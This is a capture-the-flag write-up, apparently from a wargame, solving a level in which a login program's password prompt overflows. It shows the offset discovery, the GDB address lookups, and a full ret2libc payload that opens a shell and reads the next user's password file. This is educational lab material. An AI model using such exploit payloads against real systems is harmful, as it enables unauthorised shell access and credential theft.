# Level 01

Here we find a program that first asks for a user and then for a password. But it only passes to the password if the user is correct.

By decompiling the program or using "strings", we find that the user is "dat_wil" but also a certain password "admin" which is never used.

By testing, we realize that when we enter the right user but a password too long, the program crashes. We can try to make a ret2libc.

```sh
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: dat_wil
verifying username....

Enter Password:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
nope, incorrect password...

Segmentation fault (core dumped)
```

With GDB and my pattern.py, we can find our offset for our injection.

```sh
$ python3 pattern.py 100 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A


(gdb) r < <(echo "dat_will"; echo "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A")

$ python3 pattern.py --crash 37634136

```

We've got our offset, let's find the addresses we're interested in. system, exit and "/bin/sh"

```sh
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
(gdb) find system, +9999999, "/bin/sh"
0xf7f897ec
```

Let's write our exploit:

[ OFFSET ] [ SYSTEM ADDR ] [ EXIT ADDR ] [ ARG ADDR ]

```sh
$ (echo dat_wil; python -c 'print("A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")'; cat) | ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: verifying username....

Enter Password:
nope, incorrect password...

whoami
level02
cat /home/users/level02/.pass
```
